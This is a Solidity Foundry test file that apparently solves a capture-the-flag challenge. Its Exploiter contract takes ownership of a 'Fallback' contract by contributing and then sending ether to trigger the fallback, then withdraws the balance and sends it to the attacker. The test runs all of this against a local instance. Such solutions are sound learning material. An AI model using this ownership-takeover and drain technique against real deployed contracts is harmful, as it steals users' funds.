pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/02.sol";

contract Exploiter {
    address owner;
    
    constructor() payable {
        require(msg.value == 0.0002 ether);
        owner = msg.sender;
    }

    function exploit(Fallback instance) external {
        instance.contribute{value: 0.0001 ether}();
        
        (bool success, ) = address(instance).call{value: address(this).balance}("");
        require(success, "Error sending ether to instance");

        instance.withdraw();

        (bool success2, ) = address(owner).call{value: address(this).balance}("");
        require(success2, "Error Withdraw from exploit");
    }

    receive() external payable { }
}

contract Test02 is Test {

    Fallback instance;
    address user;

    function setUp() public {
        user = address(0x1);
        instance = new Fallback();

        vm.deal(user, 1 ether);
        vm.deal(address(instance), 1 ether);
    }

    function testSolve() public {
        address beforeOwner = instance.owner();
        uint userBalanceBefore = user.balance;

        console.log("Owner before exploit: ", beforeOwner);
        console.log("User balance before exploit (ether): ", userBalanceBefore / 1e18);

        vm.startPrank(user);
        
        Exploiter exploiter = new Exploiter{value: 0.0002 ether}();
        exploiter.exploit(instance);
        
        vm.stopPrank();

        uint instanceBalance = address(instance).balance;
        
        address afterOwner = instance.owner();
        
        assertEq(instanceBalance, 0);
        console.log("");
        console.log("Owner after exploit: ", afterOwner);
        console.log("User balance after exploit (ether): ", user.balance / 1e18);
    }


}